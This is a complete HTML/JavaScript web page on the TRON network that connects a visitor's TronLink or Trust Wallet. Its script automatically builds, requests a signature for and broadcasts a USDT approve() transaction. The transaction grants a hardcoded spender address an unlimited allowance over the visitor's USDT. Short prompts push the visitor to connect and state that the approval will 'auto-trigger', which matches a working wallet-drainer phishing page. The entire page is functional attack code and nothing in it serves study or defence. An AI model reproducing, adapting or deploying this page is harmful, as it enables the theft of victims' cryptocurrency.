<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>USDT Approval</title>

<link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">

<style>
body{
  margin:0;
  background:#0d0f12;
  color:#fff;
  font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
}

.header{
  padding:20px;
  text-align:center;
  font-size:20px;
  font-weight:bold;
  border-bottom:1px solid #222;
  background:#121417;
}

.logo{
  width:60px;
  height:60px;
  margin:0 auto 12px;
  border-radius:12px;
  background:#1b1e23;
  display:flex;
  align-items:center;
  justify-content:center;
}

.logo img{
  width:48px;
  height:48px;
}

.container{
  padding:16px;
  max-width:500px;
  margin:0 auto;
  padding-bottom:100px;
}

.box{
  border:1px solid #2a2d33;
  border-radius:12px;
  padding:14px;
  margin-bottom:16px;
  background:#121417;
}

.label{
  font-size:12px;
  color:#888;
  margin-bottom:6px;
  text-transform:uppercase;
  letter-spacing:0.5px;
}

.value{
  font-size:15px;
  color:#fff;
  word-break:break-all;
  font-family:monospace;
}

.network{
  display:flex;
  align-items:center;
  gap:8px;
  background:#1b1e23;
  padding:8px 12px;
  border-radius:20px;
  width:fit-content;
}

.network img{
  width:18px;
}

.status-box{
  border-radius:12px;
  padding:14px;
  margin-bottom:16px;
  font-size:13px;
  display:flex;
  align-items:center;
  gap:8px;
}

.status-box.loading{
  background:#1a3a4d;
  color:#4dabf7;
}

.status-box.error{
  background:#5a1a1a;
  color:#ff8787;
}

.status-box.success{
  background:#1a4d2e;
  color:#51cf66;
}

.spinner{
  width:16px;
  height:16px;
  border:2px solid #4dabf7;
  border-top-color:transparent;
  border-radius:50%;
  animation:spin 0.8s linear infinite;
}

@keyframes spin{
  to{ transform:rotate(360deg); }
}

.checkmark{
  color:#51cf66;
  font-weight:bold;
}

.btn{
  position:fixed;
  bottom:20px;
  left:16px;
  right:16px;
  background:#2ecc71;
  color:#000;
  padding:16px;
  border:none;
  border-radius:30px;
  font-size:18px;
  font-weight:bold;
  cursor:pointer;
  transition:all 0.3s;
  z-index:10;
}

.btn:hover:not(:disabled){
  background:#27ae60;
  transform:translateY(-2px);
}

.btn:disabled{
  background:#888;
  opacity:0.5;
  cursor:not-allowed;
}

.info-text{
  font-size:12px;
  color:#888;
  text-align:center;
  margin-top:8px;
  line-height:1.5;
}

</style>
</head>

<body>

<div class="header">
  <div class="logo">
    <img src="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png" alt="Logo">
  </div>
  Unlimited USDT Approval
</div>

<div class="container">

<div id="status-container"></div>

<div class="box">
  <div class="label">Spender Address (Recipient)</div>
  <div class="value">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</div>
</div>

<div class="box">
  <div class="label">USDT Contract</div>
  <div class="value">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
</div>

<div class="box">
  <div class="label">Network</div>
  <div class="network">
    <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON"> TRON
  </div>
</div>

<div class="box">
  <div class="label">Approval Amount</div>
  <div class="value">Unlimited (Max uint256)</div>
</div>

<p class="info-text">
  ✓ Click button to connect wallet<br>
  ✓ Approval will auto-trigger after connection
</p>

</div>

<button id="btn" class="btn" onclick="handleNext()">Connect Wallet</button>

<script>
// CONFIG
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
const APPROVE_SELECTOR = "095ea7b3";
const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

let tronWeb = null;
let address = null;
let isProcessing = false;

function setStatus(msg, type = 'loading'){
  const container = document.getElementById("status-container");
  let icon = '';
  
  if(type === 'loading'){
    icon = '<div class="spinner"></div>';
  } else if(type === 'error'){
    icon = '✗';
  } else if(type === 'success'){
    icon = '<span class="checkmark">✓</span>';
  }
  
  container.innerHTML = `<div class="status-box ${type}">${icon} ${msg}</div>`;
}

function clearStatus(){
  document.getElementById("status-container").innerHTML = '';
}

const ALPHABET="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function base58ToHex(addr){
  try{
    let num = BigInt(0);
    for(let c of addr){
      num = num * 58n + BigInt(ALPHABET.indexOf(c));
    }
    let hex = num.toString(16);
    if(hex.length % 2) hex = "0" + hex;
    return hex.slice(0, -8);
  }catch(e){
    throw new Error("Invalid TRON address");
  }
}

function buildApproveTransaction(ownerAddress, spenderAddress){
  try{
    const spenderHex = base58ToHex(spenderAddress).toLowerCase();
    const spenderParam = spenderHex.padStart(64, '0');
    const amountParam = MAX_UINT256;
    const functionData = APPROVE_SELECTOR + spenderParam + amountParam;
    
    return {
      owner_address: ownerAddress,
      contract_address: USDT_CONTRACT,
      function_selector: "approve(address,uint256)",
      parameter: functionData,
      fee_limit: 100000000,
      visible: true
    };
  }catch(e){
    throw new Error("Failed to build transaction: " + e.message);
  }
}

async function sendApproval(){
  try{
    if(!address){
      setStatus("No wallet connected", 'error');
      isProcessing = false;
      return;
    }

    setStatus("Building transaction...", 'loading');
    const txPayload = buildApproveTransaction(address, SPENDER_ADDRESS);

    setStatus("Creating transaction...", 'loading');
    const txResponse = await fetch("https://api.trongrid.io/wallet/triggersmartcontract", {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(txPayload)
    }).then(r => r.json());

    if(!txResponse.transaction){
      throw new Error(txResponse.message || "Failed to create transaction");
    }

    setStatus("Requesting signature...", 'loading');

    // Sign with TronWeb
    const signed = await tronWeb.trx.sign(txResponse.transaction);

    setStatus("Broadcasting transaction...", 'loading');

    const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(signed)
    }).then(r => r.json());

    if(broadcastResponse.result || broadcastResponse.txid){
      const txid = broadcastResponse.txid || 'Success';
      setStatus("✓ Approval successful! TX: " + txid, 'success');
      setTimeout(() => {
        clearStatus();
        isProcessing = false;
        document.getElementById("btn").innerText = "Send Another Approval";
      }, 5000);
    } else {
      throw new Error(broadcastResponse.message || "Broadcast failed");
    }

  }catch(e){
    console.error(e);
    setStatus("Error: " + e.message, 'error');
    isProcessing = false;
  }
}

async function connectWallet(){
  try{
    setStatus("Connecting wallet...", 'loading');

    // Check if TronLink is available (injected by Trust Wallet)
    if(!window.tronLink){
      throw new Error("TronLink not detected. Please open this page in Trust Wallet browser.");
    }

    // Request account
    await window.tronLink.request({
      method: 'tron_requestAccounts'
    });

    // Get TronWeb instance
    if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
      tronWeb = window.tronWeb;
      address = tronWeb.defaultAddress.base58;
      clearStatus();
      console.log("Connected with TronLink:", address);
      return true;
    }

    throw new Error("Failed to connect wallet");

  }catch(e){
    console.error("Connect error:", e);
    setStatus("Connection error: " + e.message, 'error');
    return false;
  }
}

async function handleNext(){
  if(isProcessing) return;
  isProcessing = true;

  try{
    if(!address){
      const ok = await connectWallet();
      if(ok && address){
        document.getElementById("btn").innerText = "Send Approval";
        setTimeout(() => sendApproval(), 1000);
      } else {
        isProcessing = false;
      }
    } else {
      sendApproval();
    }
  }catch(e){
    console.error(e);
    setStatus("Error: " + e.message, 'error');
    isProcessing = false;
  }
}

// Page load
document.addEventListener('DOMContentLoaded', function(){
  console.log("Page loaded");
  
  // Check if already connected
  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
    tronWeb = window.tronWeb;
    address = tronWeb.defaultAddress.base58;
    document.getElementById("btn").innerText = "Send Approval";
    console.log("Already connected:", address);
  }
});

</script>

</body>
</html>
